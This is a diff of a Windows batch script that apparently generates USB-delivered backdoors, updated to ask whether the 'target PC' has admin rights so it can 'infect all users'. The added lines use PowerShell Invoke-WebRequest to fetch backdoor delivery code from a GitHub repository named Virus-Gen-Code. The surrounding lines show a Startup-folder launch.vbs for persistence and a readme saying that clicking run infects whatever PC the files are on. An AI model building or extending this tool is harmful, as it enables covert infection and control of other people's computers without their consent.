@@ -1,7 +1,7 @@
 :: setup
 :start
 @echo off
-set update_number=V3.24.19
+set update_number=V3.25.19
 set dev=0
 set temp=0 & set payload_is_exist=0 & set cmd_is_exist=0
 color 0F
@@ -28,6 +28,10 @@ if exist C:\ProgramData\GVGemail.sav (goto load_email) else (goto error2)
 if exist "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\launch.vbs" goto backdoor_remove
 :no_remove_backdoor
 :: manual configuration
+echo do you have admin permissions on the target PC?
+echo note: this will require you to have admin rights when infecting A PC, however it will infect all users on that PC, not just the active one.
+choice YN /m "does target PC have admin rights? Y/N:
+echo.
 echo DO NOT USE SPACES, replace them with _
 echo.
 set /p opt1=Device name:
@@ -35,8 +39,8 @@ echo where would you like to create the files
 echo if directory does not exist it will be created
 set /p opt2=directory:
 :: create placeholder file
-echo @echo off >%opt1%.bat
-echo payload.bat >>%opt1%.bat
+if %errorlevel% equ 1 (set target_admin_rights=true) else (set target_admin_rights=false)
+Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/default_placeholder").Content >%opt1%.bat
 :: upload file to github
 echo [33mregistering code on github...[0m
 git config user.name "%username%"
@@ -64,12 +68,13 @@ if exist %opt2%\payload\payload.bat (echo [92msuccessfully created backdoor fil
 timeout 1 /NOBREAK >nul
 :: generate a file to move files to their proper location
 echo [33mdownloading code to deliver backdoor...[0m
-Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC").Content >%opt2%\run.bat
+if %target_admin_rights% equ true Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC_yes_admin").Content >%opt2%\run.bat
+if %target_admin_rights% equ false Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/RC_no_admin").Content >%opt2%\run.bat
 if exist %opt2%\run.bat (echo [92msuccessfully created run file![0m) else (goto error7)
 timeout 1 /NOBREAK >nul
 echo [33mgenerating readme file...[0m
 echo clicking run will infect whatever PC the files are on, so put these files on a usb and the files will be automaticaly moved to that PC. >%opt2%\readme.txt
-echo [92msuccessfully created readme file![0m
+if exist %opt2%\readme.txt echo [92msuccessfully created readme file![0m
 timeout 1 /NOBREAK >nul
 echo [33mverifying all files where successfuly made...[0m
 if exist %opt2%\payload\launch.vbs (echo [92msilent launch exists[0m) else (goto error4)
@@ -211,7 +216,6 @@ goto emailnext
     ) else (
         goto error3
     )
-
 :dev
 echo.
 title dissabled %update_number%
